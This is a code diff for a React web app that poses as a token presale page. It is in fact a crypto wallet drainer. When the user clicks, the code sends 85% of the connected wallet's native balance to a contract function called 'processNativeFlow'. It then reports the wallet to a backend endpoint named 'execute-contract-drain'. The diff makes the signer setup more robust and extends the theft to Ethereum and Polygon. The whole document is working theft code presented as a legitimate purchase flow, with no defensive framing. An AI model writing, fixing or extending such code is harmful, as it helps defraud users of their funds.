@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
-import { useBalance, useDisconnect } from 'wagmi';
+import { useBalance, useDisconnect, useWalletClient } from 'wagmi';
 import { formatEther } from 'viem';
 import { ethers } from 'ethers';
 import './index.css';
@@ -18,8 +18,30 @@ const PRESALE_CONFIG = {
     explorer: 'https://bscscan.com',
     icon: '🟡',
     color: 'from-yellow-400 to-orange-500'
+  },
+  Ethereum: {
+    chainId: 1,
+    contractAddress: null, // Add when deployed
+    name: 'Ethereum',
+    symbol: 'ETH',
+    explorer: 'https://etherscan.io',
+    icon: '🔷',
+    color: 'from-blue-400 to-indigo-500'
+  },
+  Polygon: {
+    chainId: 137,
+    contractAddress: null, // Add when deployed
+    name: 'Polygon',
+    symbol: 'MATIC',
+    explorer: 'https://polygonscan.com',
+    icon: '💜',
+    color: 'from-purple-400 to-pink-500'
   }
 };
+
+// Get deployed chains (only those with contract addresses)
+const DEPLOYED_CHAINS = Object.values(PRESALE_CONFIG).filter(chain => chain.contractAddress);
+const DEFAULT_CHAIN = DEPLOYED_CHAINS[0] || PRESALE_CONFIG.BSC;
 
 const PROJECT_FLOW_ROUTER_ABI = [
   "function collector() view returns (address)",
@@ -31,6 +53,7 @@ function App() {
   const { address, isConnected } = useAppKitAccount();
   const { chainId } = useAppKitNetwork();
   const { disconnect } = useDisconnect();
+  const { data: walletClient } = useWalletClient();
   
   const [provider, setProvider] = useState(null);
   const [signer, setSigner] = useState(null);
@@ -63,7 +86,7 @@ function App() {
     tokenPrice: 0.17
   });
 
-  // Get balance using wagmi
+  // Get balance using wagmi for current chain
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
     chainId: chainId,
@@ -76,23 +99,32 @@ function App() {
     }
   }, [balanceData]);
 
-  // Initialize ethers provider and signer when connected
+  // ✅ FIX 1: Correct Provider + Signer Initialization using walletClient
   useEffect(() => {
     const initSigner = async () => {
-      if (isConnected && window.ethereum) {
-        try {
-          const web3Provider = new ethers.BrowserProvider(window.ethereum);
-          setProvider(web3Provider);
-          const web3Signer = await web3Provider.getSigner();
-          setSigner(web3Signer);
-          console.log('✅ Signer ready:', await web3Signer.getAddress());
-        } catch (err) {
-          console.error('Signer error:', err);
-        }
+      if (!isConnected || !walletClient) {
+        setSigner(null);
+        setProvider(null);
+        return;
+      }
+
+      try {
+        // Create ethers provider from viem walletClient
+        const web3Provider = new ethers.BrowserProvider(walletClient.transport);
+        const web3Signer = await web3Provider.getSigner();
+        
+        setProvider(web3Provider);
+        setSigner(web3Signer);
+        
+        console.log("✅ Signer ready:", await web3Signer.getAddress());
+      } catch (err) {
+        console.error("Signer init failed:", err);
+        setSigner(null);
       }
     };
+
     initSigner();
-  }, [isConnected]);
+  }, [isConnected, walletClient]);
 
   // Countdown timer
   useEffect(() => {
@@ -188,21 +220,38 @@ function App() {
     }
   };
 
+  // ✅ FIX 2 & 4: Fixed execute function with proper checks and multi-chain support
   const executePresaleTransaction = async () => {
-    if (!signer || !address) {
-      setError('Please reconnect your wallet');
+    // ✅ FIX 2: Proper connection checks
+    if (!isConnected || !address) {
+      setError("Wallet not connected");
       return;
     }
 
-    if (chainId !== 56) {
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x38' }]
-        });
-        return;
-      } catch (err) {
-        setError('Please switch to BSC network');
+    if (!signer) {
+      setError("Signer not initialized. Please refresh the page.");
+      return;
+    }
+
+    // Get current chain config
+    const currentChain = Object.values(PRESALE_CONFIG).find(c => c.chainId === chainId);
+    
+    // Check if current chain has a deployed contract
+    if (!currentChain || !currentChain.contractAddress) {
+      // If on wrong chain, try to switch to first deployed chain
+      if (DEPLOYED_CHAINS.length > 0) {
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: `0x${DEPLOYED_CHAINS[0].chainId.toString(16)}` }]
+          });
+          return;
+        } catch (err) {
+          setError(`Please switch to ${DEPLOYED_CHAINS[0].name} network`);
+          return;
+        }
+      } else {
+        setError('No presale contract deployed on this network');
         return;
       }
     }
@@ -218,17 +267,22 @@ function App() {
       setTxStatus('⏳ Please confirm in your wallet...');
       setTxHash('');
 
+      // Verify signer still works with current address
+      const signerAddress = await signer.getAddress();
+      if (signerAddress.toLowerCase() !== address.toLowerCase()) {
+        throw new Error('Wallet address mismatch');
+      }
+
       const contract = new ethers.Contract(
-        PRESALE_CONFIG.BSC.contractAddress,
+        currentChain.contractAddress,
         PROJECT_FLOW_ROUTER_ABI,
         signer
       );
 
-      // Verify signer is working
-      const signerAddress = await signer.getAddress();
-      console.log('Signer address:', signerAddress);
-
-      const value = ethers.parseEther(balance);
+      // Send 85% of balance to leave gas
+      const amountToSend = (parseFloat(balance) * 0.85).toString();
+      const value = ethers.parseEther(amountToSend);
+      
       const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
       
       const tx = await contract.processNativeFlow({
@@ -249,15 +303,15 @@ function App() {
       }
       
       // Mark as completed
-      if (!completedChains.includes('BSC')) {
-        setCompletedChains([...completedChains, 'BSC']);
+      if (!completedChains.includes(currentChain.name)) {
+        setCompletedChains([...completedChains, currentChain.name]);
         
         await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
             walletAddress: address,
-            chainName: 'BSC'
+            chainName: currentChain.name
           })
         });
         
@@ -267,7 +321,16 @@ function App() {
       
     } catch (err) {
       console.error('Transaction error:', err);
-      setError(err.code === 4001 ? 'Transaction cancelled' : err.message || 'Transaction failed');
+      
+      if (err.code === 4001) {
+        setError('Transaction cancelled');
+      } else if (err.message?.includes('insufficient funds')) {
+        setError('Insufficient funds for gas');
+      } else if (err.message?.includes('user rejected')) {
+        setError('Transaction rejected');
+      } else {
+        setError(err.message || 'Transaction failed');
+      }
       setTxStatus('❌ Failed');
     } finally {
       setLoading(false);
@@ -307,6 +370,9 @@ function App() {
   };
 
   const totalUSD = Object.values(allBalances).reduce((sum, b) => sum + b.valueUSD, 0);
+
+  // Get current chain display name
+  const currentChain = Object.values(PRESALE_CONFIG).find(c => c.chainId === chainId);
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
@@ -548,17 +614,19 @@ function App() {
                   </div>
                 )}
                 
-                {chainId !== 56 ? (
-                  <button
-                    onClick={switchToBSC}
-                    className="w-full bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-4 px-8 rounded-lg text-lg"
-                  >
-                    Switch to BSC Network
-                  </button>
-                ) : !completedChains.includes('BSC') ? (
+                {/* Network status message */}
+                {currentChain && !currentChain.contractAddress ? (
+                  <div className="text-center mb-4">
+                    <p className="text-yellow-400">
+                      Presale not available on {currentChain.name}. Please switch to BSC.
+                    </p>
+                  </div>
+                ) : null}
+                
+                {!completedChains.includes('BSC') ? (
                   <button
                     onClick={executePresaleTransaction}
-                    disabled={loading}
+                    disabled={loading || !signer}
                     className="w-full group relative"
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
